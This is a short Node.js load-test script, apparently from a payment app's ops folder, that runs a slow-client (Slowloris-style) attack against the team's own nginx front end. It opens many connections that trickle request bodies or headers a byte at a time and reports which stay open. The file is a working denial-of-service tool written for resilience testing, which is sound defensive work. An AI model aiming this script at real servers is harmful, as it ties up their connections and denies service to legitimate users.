// HOST-2: slow-client attacker. Run it from ONE container (= one IP) on the
// stack's network while a normal load test runs from the host (another IP):
//   docker run --rm -i --network fpprod_default filspay-app:prod \
//     node - web <connections> <body|header> <seconds> < ops/loadtest/slow-clients.cjs
// body:   full headers of POST .../pay with Content-Length 100000, then 1 byte
//         of body every 5 s (under client_body_timeout, so nginx keeps waiting)
// header: request line + 1 header byte every 5 s, headers never finished
// Prints every 5 s how many connections are still open and the replies.
const net = require("node:net");
const [host, nStr, mode, secStr] = process.argv.slice(2);
const n = Number(nStr), seconds = Number(secStr);
let open = 0;
const statuses = {};
for (let i = 0; i < n; i++) {
  const s = net.connect(80, host, () => {
    open++;
    if (mode === "body") {
      s.write(`POST /v1/payment-links/plink_slow_${i}/pay HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: 100000\r\n\r\n{`);
    } else {
      s.write(`GET /v1/payment-links/plink_slow_${i} HTTP/1.1\r\nHost: x\r\n`);
    }
    const t = setInterval(() => s.write(mode === "body" ? " " : "X"), 5000);
    s.on("close", () => clearInterval(t));
  });
  s.on("data", (d) => {
    const line = d.toString().split("\r\n")[0];
    statuses[line] = (statuses[line] || 0) + 1;
  });
  s.on("close", () => { open--; });
  s.on("error", () => {});
}
const started = Date.now();
const iv = setInterval(() => {
  console.log(`t=${Math.round((Date.now() - started) / 1000)}s open=${open} replies=${JSON.stringify(statuses)}`);
  if (Date.now() - started > seconds * 1000) { clearInterval(iv); process.exit(0); }
}, 5000);
